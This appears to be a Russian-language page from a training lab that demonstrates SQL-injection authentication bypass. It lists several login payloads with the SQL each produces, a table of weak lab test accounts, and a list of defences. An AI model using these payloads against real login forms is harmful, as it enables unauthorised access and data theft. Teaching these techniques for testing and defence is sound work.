Примеры SQL-инъекций для обхода аутентификации:

1. Обход пароля для конкретного пользователя:

Имя пользователя: admin'--

Пароль: любой

Получившийся SQL: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'

2. Вход как первый пользователь в таблице:

Имя пользователя: ' OR '1'='1

Пароль: ' OR '1'='1

Получившийся SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'

3. Вход без знания имени пользователя:

Имя пользователя: ' OR username LIKE 'a%'--

Пароль: любой

Найдет пользователей, имена которых начинаются с 'a'

Тестовые учетные записи:

Имя пользователя Пароль
adminadmin123
alicepassword123
bobqwerty
eve123456

Почему это опасно?

  • Злоумышленник может войти без пароля
  • Можно извлечь хэши паролей из базы данных
  • Можно модифицировать или удалить данные
  • Можно получить доступ к данным других пользователей

Как защититься:

  • Используйте параметризованные запросы
  • Храните пароли в хэшированном виде (bcrypt, Argon2)
  • Ограничьте количество попыток входа
  • Используйте двухфакторную аутентификацию
